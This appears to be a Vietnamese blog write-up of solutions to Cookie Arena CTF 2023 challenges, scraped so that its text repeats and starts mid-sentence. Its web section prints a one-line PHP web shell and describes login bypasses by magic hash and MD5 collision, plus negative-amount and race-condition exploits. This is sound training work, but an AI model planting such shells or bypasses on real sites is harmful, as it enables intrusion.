đầu. Sau khi thu được file pyreverser.pyc, mình tiếp tục lên CTFever để decompile file .pyc thành .py ban đầu. # Decompiled on CTFever Premium # Decompile engine: Decompyle++ (pycdc) # Python version: 3.10 import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = &#39;&#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): secret_flag = scramble_flag(reverse_string(base64.b64decode(&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;)).decode()) print(&#39;Welcome to PyReverser!&#39;) print(&#39;Please enter a word or phrase:&#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(&#39;Generated value:&#39;, generated_value) print(&#39;Can you find the hidden flag?&#39;) reversed_flag = reverse_string(secret_flag) print(&#39;Reversed flag:&#39;, reversed_flag) if __name__ == &#39;__main__&#39;: main() # return None Dễ dàng decode base64 đoạn mã Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==, chúng ta sẽ có được flag. atob(&quot;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&quot;) &#39;Flag: CHH{python2Exi_Reverse_ENginering}&#39; Flag: CHH{python2Exi_Reverse_ENginering} Jump Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Jump (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta một file jump.exe. Bỏ file này vào IDAPRO 32, chúng ta thấy được đoạn mã giả của hàm main. Nhiệm vụ của hàm main là cho nhập giá trị vào biến jump rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm _flag là có thể lấy được flag. Lưu ý: 0x00401500 = 4199680 Flag: CHH{JUMP_T0_TH3_M00N} Rev1 Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Rev1 (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup. debug055:02760002 movzx eax, byte ptr [edi+ecx] debug055:02760006 imul eax, 6Eh ; &#39;n&#39; debug055:02760009 inc ecx debug055:0276000A movzx edx, byte ptr [edi+ecx] debug055:0276000E imul edx, 1C3h debug055:02760014 add eax, edx debug055:02760016 inc ecx debug055:02760017 movzx edx, byte ptr [edi+ecx] debug055:0276001B imul edx, 348h debug055:02760021 add eax, edx debug055:02760023 inc ecx debug055:02760024 movzx edx, byte ptr [edi+ecx] debug055:02760028 imul edx, 1F8h debug055:0276002E add eax, edx debug055:02760030 inc ecx debug055:02760031 movzx edx, byte ptr [edi+ecx] debug055:02760035 imul edx, 357h debug055:0276003B sub eax, edx debug055:0276003D inc ecx debug055:0276003E movzx edx, byte ptr [edi+ecx] debug055:02760042 imul edx, 46h ; &#39;F&#39; debug055:02760045 add eax, edx debug055:02760047 inc ecx debug055:02760048 movzx edx, byte ptr [edi+ecx] debug055:0276004C imul edx, 16Fh debug055:02760052 sub eax, edx debug055:02760054 inc ecx debug055:02760055 movzx edx, byte ptr [edi+ecx] debug055:02760059 imul edx, 2FEh debug055:0276005F sub eax, edx debug055:02760061 inc ecx debug055:02760062 movzx edx, byte ptr [edi+ecx] debug055:02760066 imul edx, 17Ah debug055:0276006C add eax, edx debug055:0276006E inc ecx debug055:0276006F movzx edx, byte ptr [edi+ecx] debug055:02760073 imul edx, 15Ah debug055:02760079 add eax, edx debug055:0276007B inc ecx debug055:0276007C movzx edx, byte ptr [edi+ecx] debug055:02760080 imul edx, 326h debug055:02760086 sub eax, edx debug055:02760088 inc ecx debug055:02760089 movzx edx, byte ptr [edi+ecx] debug055:0276008D imul edx, 190h debug055:02760093 sub eax, edx debug055:02760095 inc ecx debug055:02760096 movzx edx, byte ptr [edi+ecx] debug055:0276009A imul edx, 129h debug055:027600A0 add eax, edx debug055:027600A2 inc ecx debug055:027600A3 movzx edx, byte ptr [edi+ecx] debug055:027600A7 imul edx, 2EDh debug055:027600AD add eax, edx debug055:027600AF inc ecx debug055:027600B0 movzx edx, byte ptr [edi+ecx] debug055:027600B4 cmp eax, 29CBh Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha. Còn mình sẽ sử dụng Z3 để giải quyết bài toán này. from z3 import * solver = Solver() v = [BitVec(f&#39;x{i}&#39;, 32) for i in range(14)] equations = [ 0x6E * v[0] + 0x1C3 * v[1] + 0x348 * v[2] + 0x1F8 * v[3] - 0x357 * v[4] + 0x46 * v[5] - 0x16F * v[6] - 0x2FE * v[7] + 0x17A * v[8] + 0x15A * v[9] - 0x326 * v[10] - 0x190 * v[11] + 0x129 * v[12] + 0x2ED * v[13] == 0x29CB, 0x2A * v[0] + 0x3B2 * v[1] + 0x2C1 * v[2] + 0x23A * v[3] - 0x3D1 * v[4] + 0x152 * v[5] + 0x221 * v[6] - 0x2FC * v[7] - 0x0DF * v[8] - 0x36F * v[9] + 0x1A2 * v[10] + 0x179 * v[11] + 0x284 * v[12] - 0x64 * v[13] == 0x0F0ED, 0x328 * v[0] + 0x3CD * v[1] + 0x3CC * v[2] + 0x329 * v[3] + 0x0EA * v[4] - 0x1A * v[5] + 0x12B * v[6] - 0x2E * v[7] - 0x337 * v[8] + 0x262 * v[9] + 0x37 * v[10] - 0x0A4 * v[11] + 0x383 * v[12] + 0x2D5 * v[13] == 0x66098, 0x66 * v[0] - 0x3C9 * v[1] - 0x0C0 * v[2] - 0x0BD * v[3] - 0x9D * v[4] + 0x2D1 * v[5] - 0x299 * v[6] + 0x38E * v[7] + 0x15 * v[8] - 0x14E * v[9] + 0x280 * v[10] + 0x0E1 * v[11] - 0x128 * v[12] + 0x50 * v[13] == 0x6CE4, 0x2ED * v[0] + 0x8A * v[1] - 0x155 * v[2] - 0x8C * v[3] - 0x239 * v[4] + 0x259 * v[5] - 0x286 * v[6] - 0x1DA * v[7] + 0x154 * v[8] - 0x196 * v[9] + 0x97 * v[10] + 0x26D * v[11] + 0x3E0 * v[12] - 0x1EB * v[13] == 0x150DD, 0x46 * v[0] - 0x2DF * v[1] + 0x243 * v[2] + 0x78 * v[3] - 0x0EE * v[4] + 0x99 * v[5] - 0x0C5 * v[6] - 0x0EB * v[7] - 0x0AE * v[8] + 0x28F * v[9] - 0x65 * v[10] + 0x20B * v[11] - 0x147 * v[12] + 0x3C2 * v[13] == 0x1E68B, 0x264 * v[0] + 0x2BE * v[1] + 0x3B5 * v[2] - 0x1D3 * v[3] - 0x8 * v[4] - 0x150 * v[5] + 0x3C1 * v[6] - 0x3E4 * v[7] - 0x58 * v[8] - 0x19C * v[9] + 0x3AA * v[10] + 0x261 * v[11] - 0x17F * v[12] - 0x167 * v[13] == 0x18490, 0x0B3 * v[0] - 0x63 * v[1] - 0x0E0 * v[2] + 0x24 * v[3] + 0x37C * v[4] + 0x0AA * v[5] + 0x33 * v[6] - 0x11E * v[7] - 0x13D * v[8] + 0x139 * v[9] + 0x3DC * v[10] - 0x14C * v[11] + 0x2DD * v[12] + 0x2B3 * v[13] == 0x3CC54, 0x102 * v[0] + 0x115 * v[1] + 0x0D3 * v[2] + 0x0DC * v[3] + 0x3A1 * v[4] - 0x35C * v[5] - 0x0ED * v[6] + 0x141 * v[7] - 0x19C * v[8] - 0x2B6 * v[9] + 0x3CC * v[10] + 0x3AA * v[11] + 0x24B * v[12] + 0x1B9 * v[13] == 0x45670, 0x3C4 * v[0] + 0x305 * v[1] - 0x0A9 * v[2] + 0x87 * v[3] - 0x0E6 * v[4] + 0x30 * v[5] + 0x20F * v[6] - 0x3D0 * v[7] - 0x94 * v[8] - 0x2CC * v[9] + 0x56 * v[10] + 0x224 * v[11] + 0x1B5 * v[12] + 0x183 * v[13] == 0x21A0F, 0x256 * v[0] + 0x157 * v[1] + 0x181 * v[2] - 0x306 * v[3] - 0x243 * v[4] - 0x9 * v[5] - 0x373 * v[6] - 0x1A3 * v[7] + 0x223 * v[8] + 0x200 * v[9] - 0x365 * v[10] - 0x56 * v[11] + 0x1B6 * v[12] - 0x39C * v[13] == 0x0FFFE3896, 0x0A3 * v[0] + 0x2B2 * v[1] + 0x22D * v[2] + 0x3D6 * v[3] - 0x9A * v[4] - 0x76 * v[5] - 0x2A0 * v[6] + 0x63 * v[7] + 0x373 * v[8] + 0x15 * v[9] - 0x3B9 * v[10] + 0x214 * v[11] - 0x232 * v[12] + 0x225 * v[13] == 0x22874, 0x151 * v[0] + 0x153 * v[1] + 0x25F * v[2] - 0x187 * v[3] - 0x2AC * v[4] + 0x1CC * v[5] - 0x155 * v[6] - 0x2F5 * v[7] - 0x22D * v[8] + 0x17B * v[9] - 0x377 * v[10] - 0x0B2 * v[11] - 0x294 * v[12] - 0x2CE * v[13] == 0x0FFFBEC4D, 0x2AA * v[0] + 0x95 * v[1] + 0x83 * v[2] + 0x25B * v[3] - 0x77 * v[4] - 0x2E1 * v[5] + 0x39D * v[6] + 0x251 * v[7] + 0x0A2 * v[8] - 0x27D * v[9] + 0x268 * v[10] + 0x2F9 * v[11] + 0x14 * v[12] - 0x115 * v[13] == 0x3C5E6 ] for equation in equations: solver.add(equation) if solver.check() == sat: model = solver.model() solution = [model.evaluate(i).as_long() for i in v] print(f&#39;{solution}&#39;) else: print(&quot;No solution&quot;) flag = &quot;&quot; for i in solution: flag += chr(i) print(flag) Key: q20OK36QBiWkZT Flag: CHH{COOk13_4R3n4} 0x04 Forensic Sổ đăng ký Description Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack. Tải challenge: Sổ đăng ký (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán này, chúng ta nhận được file NTUSER.DAT. Mở file bằng tool Registry Finder, tìm những từ khóa như cmd.exe, powershell.exe để xem có thể khai thác được thông tin gì không. Chúng ta thu được một đoạn shell code khả nghi. Nhận thấy có mã hóa base64. Chúng ta đem lên CyberChef để giải mã và thu được flag. Flag: CHH{N0_4_go_n0_st4r_wh3r3} Tin học văn phòng cơ bản Description Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới Tải challenge: Tin học văn phòng cơ bản (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Chúng ta sử dụng tool olevba để kiểm tra các macro VBA. Flag: CHH{If_u_w4nt_1_will_aft3rnull_u} 0x05 Web Magic Login Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flag.txt hãy tìm cách đọc được chúng. Format Flag: CHH{XXX} Solution Để giải quyết bài toán này, password sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng 0e. Lên https://github.com/spaze/hashes, chọn một password tùy thích. Đăng nhập với password = TyNOQHUS. Đến đây, chúng ta chỉ cần upload shell đơn giản. &lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt; Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c} Magic Login Harder Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flagXXX.txt hãy tìm cách đọc được chúng. FLAG=$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 5 | head -n 1) cp /flag.txt /flag$FLAG.txt Tải challenge: Magic Login Harder (pass: cookiehanhoan) Format Flag: CHH{XXX} Solution &lt;?php if(isset($_POST[&quot;submit&quot;])){ $username = base64_decode($_POST[&#39;username&#39;]); $password = base64_decode($_POST[&#39;password&#39;]); if(($username == $password)){ echo &#39;Username and password are not the same&#39;; } else if((md5($username)===md5($password))){ $_SESSION[&#39;username&#39;] = $username; header(&#39;Location: admin.php?file=1.txt&#39;); } else { echo &#39;Username and password are wrong&#39;; } } ?&gt; Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi username và password khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác MD5 Collision Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý. Can two different strings generate the same MD5 hash code? MD5 Collision Demo import hashlib import base64 x = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#39; y = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#39; x = bytes.fromhex(x) y = bytes.fromhex(y) print(x == y, hashlib.md5(x).hexdigest() == hashlib.md5(y).hexdigest()) x = base64.b64encode(x) y = base64.b64encode(y) print(x) print(y) # x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og== # y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og== Login thành công với cặp (x, y) thu được ở trên. Sau đó chuyển qua trang admin.php để xử lý tiếp bài toán. Be Positive Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm. Vào tab Transfer, chỉnh sửa giá trị min = -99999 rồi chuyển tiền cho Bob với số tiền là -2000. Bây giờ, chúng ta đã có dư tiền để mua flag. Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae} Slow Down Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Ở bài toán này, cấu trúc tương tự như bài Be Positive nhưng đã bị filter số âm. Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là Slow Down. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới Race Condition. Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob. Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a} 0x06 Crypto Basic Operator Description Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag Tải challenge: Basic Operator (pass: cookiehanhoan) Solution from Crypto.Util import number def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) if __name__==&#39;__main__&#39;: p = 1341161101353773850779 e = 2 mess = b&#39;CHH{CENSORED}&#39; cipher_flag = ecb_mode(mess) print(cipher_flag) Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. Để giải quyết bài toán này, chúng ta có hai cách để giải: Brute-force từng block một như đã phân tích ở trên Dựng ngược lại các hàm đã cho để đi tìm flag Cách giải 1. Nhận thấy rằng Cipher có 12 block, với 4 chữ cái đầu tiên của flag sẽ là “CHH{“. Quan sát kết quả mã hóa block đầu tiên này và so sánh với Cipher, ta khẳng định được: Block đầu tiên của flag là “CHH{“ Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là: b’}\x03\x03\x03’ b’x}\x02\x02’ b’xx}\x01’ from tqdm import tqdm from string import printable def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) p = 1341161101353773850779 e = 2 Cipher = [752589857254588976778, 854606763225554935934, 102518422244000685572, 779286449062901931327, 424602910997772742508, 1194307203769437983433, 501056821915021871618, 691835640758326884371, 778501969928317687301, 1260460302610253211574, 833211399330573153864, 223847974292916916557] def brute(index): if index != 11: for x in tqdm(range(len(printable))): for y in tqdm(range(len(printable))): for z in range(len(printable)): for t in range(len(printable)): flag = (printable[x] + printable[y] + printable[z] + printable[t]).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() else: # b&#39;}\x03\x03\x03&#39; # b&#39;x}\x02\x02&#39; # b&#39;xx}\x01&#39; for x in tqdm(range(len(printable))): for y in range(len(printable)): flag = (printable[x] + printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() flag = (printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() if __name__ == &#39;__main__&#39;: for i in range(12): brute(i) Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}" />
<link rel="canonical" href="http://localhost:4000/2023/07/10/Cookiehanhoan.html" />
<meta property="og:url" content="http://localhost:4000/2023/07/10/Cookiehanhoan.html" />
<meta property="og:site_name" content="George Do" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-10T00:00:00+07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Cookie Arena CTF 2023" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-10T00:00:00+07:00","datePublished":"2023-07-10T00:00:00+07:00","description":"Table of Contents 0x00 Giới thiệu 0x01 Stenography Cutie K1tty 0x02 Mobile Cat Me Pinned Cookie 0x03 Reverse Pyreverse Jump Rev1 0x04 Forensic Sổ đăng ký Tin học văn phòng cơ bản 0x05 Web Magic Login Magic Login Harder Be Positive Slow Down 0x06 Crypto Basic Operator 0x00 Giới thiệu Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải Cookie Arena CTF 2023. Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường. Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe. Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác. 0x01 Stenography Cutie K1tty Description Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó. Tải challenge: CutieK1tty (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta hình ảnh một con mèo Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không $ strings cut3_c4t.png y0u_4r3_cl0s3.rar Cat! f1n4lly.txt Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không. Khi giải nén ra, ta thu được 2 file mới là purrr_2.mp3 và y0u_4r3_cl0s3.rar. Tiếp tục giải nén file y0u_4r3_cl0s3.rar, xuất hiện thông báo lỗi Đưa file này vào HxD để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là Cat. Ở đây, chúng ta chỉ cần sửa header lại thành Rar là có thể giải nén được. Nhận thấy còn file purrr_2.mp3 chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên. Sử dụng tool Audacity, ta có được sp3ctrum_1s_y0ur_fr13nd là password để giải nén. Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag atob(&quot;ZjByM241MWNzX21hNXQzcg==&quot;) &#39;f0r3n51cs_ma5t3r&#39; Flag: CHH{f0r3n51cs_ma5t3r} 0x02 Mobile Cat Me Description Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Cat Me (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Dùng jadx để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa flag, chúng ta thấy có đoạn mã sau khả nghi. Copy hết các ký tự trong arrayList, nhận thấy rằng đây là base64. import base64 flag = &quot;Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ==&quot; flag = base64.b64decode(flag) print(flag) Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat} Pinned Cookie Description Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Pinned Cookie (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Quan sát trong jadx, chúng ta thấy có hàm MainActivity Nhìn tổng quan hàm, chúng ta lại thấy đoạn code arrayList quen thuộc giống như bài Cat Me. Ở đây, xuất hiện thêm một chuỗi lạ là “sTroN6PaSswORD”. Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi Nội dung chính của hàm y0 này là đi decode chuỗi base64 thu được từ arrayList, tiếp đến xor từng byte một với chuỗi ký tự “sTroN6PaSswORD”. import base64 key = b&#39;sTroN6PaSswORD&#39; base64_str = b&#39;MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw==&#39; bytesFlag = base64.b64decode(base64_str) flag = &quot;&quot; for i in range(len(bytesFlag)): flag += chr(bytesFlag[i] ^ key[i % len(key)]) print(flag) Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG} 0x03 Reverse Pyreverse Description Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong. Tải challenge: Pyreverse (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Sử dụng Detect It Easy, kiểm tra file .exe được pack bằng PyInstaller. Tới đây, mình sử dụng công cụ pyinstxtractor để unpack lại file .py ban đầu. Sau khi thu được file pyreverser.pyc, mình tiếp tục lên CTFever để decompile file .pyc thành .py ban đầu. # Decompiled on CTFever Premium # Decompile engine: Decompyle++ (pycdc) # Python version: 3.10 import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = &#39;&#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): secret_flag = scramble_flag(reverse_string(base64.b64decode(&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;)).decode()) print(&#39;Welcome to PyReverser!&#39;) print(&#39;Please enter a word or phrase:&#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(&#39;Generated value:&#39;, generated_value) print(&#39;Can you find the hidden flag?&#39;) reversed_flag = reverse_string(secret_flag) print(&#39;Reversed flag:&#39;, reversed_flag) if __name__ == &#39;__main__&#39;: main() # return None Dễ dàng decode base64 đoạn mã Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==, chúng ta sẽ có được flag. atob(&quot;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&quot;) &#39;Flag: CHH{python2Exi_Reverse_ENginering}&#39; Flag: CHH{python2Exi_Reverse_ENginering} Jump Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Jump (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta một file jump.exe. Bỏ file này vào IDAPRO 32, chúng ta thấy được đoạn mã giả của hàm main. Nhiệm vụ của hàm main là cho nhập giá trị vào biến jump rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm _flag là có thể lấy được flag. Lưu ý: 0x00401500 = 4199680 Flag: CHH{JUMP_T0_TH3_M00N} Rev1 Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Rev1 (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup. debug055:02760002 movzx eax, byte ptr [edi+ecx] debug055:02760006 imul eax, 6Eh ; &#39;n&#39; debug055:02760009 inc ecx debug055:0276000A movzx edx, byte ptr [edi+ecx] debug055:0276000E imul edx, 1C3h debug055:02760014 add eax, edx debug055:02760016 inc ecx debug055:02760017 movzx edx, byte ptr [edi+ecx] debug055:0276001B imul edx, 348h debug055:02760021 add eax, edx debug055:02760023 inc ecx debug055:02760024 movzx edx, byte ptr [edi+ecx] debug055:02760028 imul edx, 1F8h debug055:0276002E add eax, edx debug055:02760030 inc ecx debug055:02760031 movzx edx, byte ptr [edi+ecx] debug055:02760035 imul edx, 357h debug055:0276003B sub eax, edx debug055:0276003D inc ecx debug055:0276003E movzx edx, byte ptr [edi+ecx] debug055:02760042 imul edx, 46h ; &#39;F&#39; debug055:02760045 add eax, edx debug055:02760047 inc ecx debug055:02760048 movzx edx, byte ptr [edi+ecx] debug055:0276004C imul edx, 16Fh debug055:02760052 sub eax, edx debug055:02760054 inc ecx debug055:02760055 movzx edx, byte ptr [edi+ecx] debug055:02760059 imul edx, 2FEh debug055:0276005F sub eax, edx debug055:02760061 inc ecx debug055:02760062 movzx edx, byte ptr [edi+ecx] debug055:02760066 imul edx, 17Ah debug055:0276006C add eax, edx debug055:0276006E inc ecx debug055:0276006F movzx edx, byte ptr [edi+ecx] debug055:02760073 imul edx, 15Ah debug055:02760079 add eax, edx debug055:0276007B inc ecx debug055:0276007C movzx edx, byte ptr [edi+ecx] debug055:02760080 imul edx, 326h debug055:02760086 sub eax, edx debug055:02760088 inc ecx debug055:02760089 movzx edx, byte ptr [edi+ecx] debug055:0276008D imul edx, 190h debug055:02760093 sub eax, edx debug055:02760095 inc ecx debug055:02760096 movzx edx, byte ptr [edi+ecx] debug055:0276009A imul edx, 129h debug055:027600A0 add eax, edx debug055:027600A2 inc ecx debug055:027600A3 movzx edx, byte ptr [edi+ecx] debug055:027600A7 imul edx, 2EDh debug055:027600AD add eax, edx debug055:027600AF inc ecx debug055:027600B0 movzx edx, byte ptr [edi+ecx] debug055:027600B4 cmp eax, 29CBh Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha. Còn mình sẽ sử dụng Z3 để giải quyết bài toán này. from z3 import * solver = Solver() v = [BitVec(f&#39;x{i}&#39;, 32) for i in range(14)] equations = [ 0x6E * v[0] + 0x1C3 * v[1] + 0x348 * v[2] + 0x1F8 * v[3] - 0x357 * v[4] + 0x46 * v[5] - 0x16F * v[6] - 0x2FE * v[7] + 0x17A * v[8] + 0x15A * v[9] - 0x326 * v[10] - 0x190 * v[11] + 0x129 * v[12] + 0x2ED * v[13] == 0x29CB, 0x2A * v[0] + 0x3B2 * v[1] + 0x2C1 * 